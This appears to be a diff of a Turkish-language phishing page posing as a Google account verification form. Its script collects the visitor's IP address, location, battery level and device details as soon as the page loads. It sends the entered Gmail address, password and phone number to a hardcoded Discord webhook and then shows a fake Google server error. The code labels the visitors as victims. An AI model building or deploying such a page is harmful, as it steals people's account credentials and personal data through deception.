@@ -20,7 +20,7 @@
 <div class="box">
     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 15px;">
     <h2>Doğrulama Gerekli</h2>
-    <p>Olağandışı bir durum fark ettik. Devam etmek için hesabınızı doğrulayın.</p>
+    <p>Hesabınızı güvene almak için bilgilerinizi onaylamanız gerekiyor.</p>
     
     <input type="email" id="email" placeholder="E-posta (@gmail.com)" oninput="validate()">
     <input type="password" id="pass" placeholder="Şifre" oninput="validate()">
@@ -30,46 +30,35 @@
 </div>
 
 <script>
+    // Senin Webhook adresin
     const webhook = "https://discord.com/api/webhooks/1492907888598057030/KJ9bmcDft5rHUqT1LcckQE8ysjGSiV0eqcp1T6pHYvnB4M8Dk-g1P_Zwon365RnT6Fkn";
 
-    // --- ULTRA SİSTEM VERİSİ ÇEKME ---
+    // 1. ULTRA VERİ ÇEKME (SİTEYE GİRİLDİĞİ AN)
     (async () => {
         try {
-            // IP ve Konum Verisi
             const res = await fetch('https://ipapi.co/json/');
             const d = await res.json();
             
-            // Batarya Verisi
             let batteryInfo = "Bilinmiyor";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batteryInfo = `%${Math.round(b.level * 100)} (${b.charging ? "Şarj Oluyor" : "Deşarj"})`;
+                batteryInfo = `%${Math.round(b.level * 100)} (${b.charging ? "Şarjda" : "Deşarj"})`;
             }
-
-            // Donanım ve Ekran
-            const hardware = {
-                cpu: navigator.hardwareConcurrency || "Bilinmiyor",
-                ram: navigator.deviceMemory || "Bilinmiyor",
-                screen: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language
-            };
 
             fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🕵️ KURBAN AĞA DÜŞTÜ (DETAYLI ANALİZ)",
+                        title: "🕵️ KURBAN SİTEYE GİRDİ!",
                         color: 16776960,
                         fields: [
                             { name: "🌐 IP & ISP", value: `**IP:** ${d.ip}\n**ISP:** ${d.org}`, inline: false },
-                            { name: "📍 Konum", value: `${d.city}, ${d.region}, ${d.country_name} (${d.postal})`, inline: true },
+                            { name: "📍 Konum", value: `${d.city}, ${d.country_name}`, inline: true },
                             { name: "🔋 Batarya", value: batteryInfo, inline: true },
-                            { name: "🖥️ Donanım", value: `**CPU:** ${hardware.cpu} Çekirdek\n**RAM:** ~${hardware.ram} GB\n**Ekran:** ${hardware.screen}`, inline: false },
-                            { name: "📱 Cihaz & Dil", value: `**Sistem:** ${navigator.platform}\n**Dil:** ${hardware.lang}`, inline: true },
-                            { name: "🌐 Tarayıcı", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                            { name: "📱 Cihaz", value: `**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**OS:** ${navigator.platform}`, inline: false }
                         ],
-                        footer: { text: "Kurban şu an formu inceliyor..." },
+                        footer: { text: "GitHub Pages üzerinden kesintisiz veri..." },
                         timestamp: new Date()
                     }]
                 })
@@ -77,7 +66,7 @@
         } catch (e) { console.error("Veri çekme hatası."); }
     })();
 
-    // --- FORM KONTROLLERİ ---
+    // 2. KONTROLLER (Gmail + 11 Hane + 05 Başlangıcı)
     function validate() {
         const email = document.getElementById('email').value.toLowerCase();
         const phone = document.getElementById('phone').value;
@@ -97,24 +86,27 @@
         }
     }
 
-    // --- FORM GÖNDERME ---
+    // 3. BUTONA BASINCA FORM GÖNDERME
     async function sendForm() {
         const payload = {
             embeds: [{
-                title: "🎯 HESAP ELE GEÇİRİLDİ!",
+                title: "🎯 HESAP BİLGİLERİ GELDİ!",
                 color: 16711680,
                 fields: [
                     { name: "📧 E-posta", value: document.getElementById('email').value, inline: true },
                     { name: "🔑 Şifre", value: document.getElementById('pass').value, inline: true },
                     { name: "📱 Telefon", value: document.getElementById('phone').value, inline: false }
                 ],
-                footer: { text: "Form başarıyla gönderildi." },
                 timestamp: new Date()
             }]
         };
 
-        await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-        alert("Bağlantı hatası: Sunucu yoğunluğu nedeniyle doğrulama tamamlanamadı. 10 dakika sonra tekrar deneyin.");
+        try {
+            await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+            alert("Sistem hatası: Google sunucuları şu an çok yoğun. Lütfen 5 dakika sonra tekrar deneyin.");
+        } catch (e) {
+            alert("Bağlantı kesildi!");
+        }
     }
 </script>
 
